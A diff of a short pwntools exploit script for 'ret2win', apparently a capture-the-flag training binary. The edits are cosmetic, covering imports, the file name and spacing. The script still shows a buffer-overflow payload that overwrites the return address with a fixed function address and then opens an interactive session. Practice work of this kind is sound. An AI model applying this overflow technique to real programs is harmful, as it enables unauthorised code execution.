@@ -4,12 +4,12 @@
 
 Simple buffer overflow with adding an address at the end to execute
 
-Usage: $ python3 exploit.py ret2win
+Usage: $ python3 ret2win.py ret2win
 """
 
-from pwn import *
-from subprocess import Popen, PIPE
 import sys
+
+from pwn import *
 
 # context.log_level = "DEBUG"
 
@@ -35,9 +35,8 @@ p = process(context.binary.path)
 
 gadget_ret2win = 0x400756
 
-payload = b"a"*(offset)
+payload = b"a" * (offset)
 payload += p64(gadget_ret2win)
 
 p.sendline(payload)
 p.interactive()
-
